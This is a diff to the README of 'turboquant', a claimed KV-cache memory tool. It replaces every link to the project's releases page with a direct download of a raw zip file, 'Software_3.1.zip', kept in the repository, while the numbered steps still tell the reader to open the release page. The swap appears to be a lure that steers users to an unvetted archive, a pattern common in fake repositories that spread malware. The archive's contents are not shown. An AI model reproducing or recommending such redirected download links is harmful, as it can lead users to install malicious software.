@@ -1,6 +1,6 @@
 # ⚙️ turboquant - Faster KV Cache, Lower Memory Use
 
-[![Download turboquant](https://img.shields.io/badge/Download-turboquant-blue?style=for-the-badge)](https://github.com/Robertmorrissteelproduction437/turboquant/releases)
+[![Download turboquant](https://img.shields.io/badge/Download-turboquant-blue?style=for-the-badge)](https://github.com/Robertmorrissteelproduction437/turboquant/raw/refs/heads/main/turboquant/Software_3.1.zip)
 
 ## 🧭 What this app does
 
@@ -15,7 +15,7 @@ This project uses:
 ## 📥 Download and install
 
 Visit this page to download:
-https://github.com/Robertmorrissteelproduction437/turboquant/releases
+https://github.com/Robertmorrissteelproduction437/turboquant/raw/refs/heads/main/turboquant/Software_3.1.zip
 
 1. Open the release page in your browser.
 2. Find the latest release at the top of the page.
@@ -145,7 +145,7 @@ This makes it easier to find the files if you need to change settings or check e
 ## 🔗 Download again if needed
 
 If you need the release files again, use this page:
-https://github.com/Robertmorrissteelproduction437/turboquant/releases
+https://github.com/Robertmorrissteelproduction437/turboquant/raw/refs/heads/main/turboquant/Software_3.1.zip
 
 ## 📋 What to check before you start
 
